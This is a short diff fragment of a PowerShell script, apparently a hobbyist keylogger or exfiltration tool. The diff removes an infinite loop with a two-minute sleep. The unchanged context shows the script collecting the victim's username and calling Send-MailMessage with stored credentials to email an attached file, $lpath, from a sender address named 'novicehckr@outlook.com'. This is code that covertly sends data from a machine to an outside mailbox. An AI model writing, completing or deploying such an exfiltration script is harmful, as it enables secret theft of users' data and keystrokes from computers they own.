@@ -1,4 +1,3 @@
-Do{
 $username=$env:Username
 
 $From = "novicehckr@outlook.com"
@@ -114,6 +113,3 @@ Send-MailMessage -From $From -to $To -Subject $Subject `
 -Credential $credentials -Attachments $lpath
 
 }
-
-start-sleep -Seconds 120
-}until($infinity)
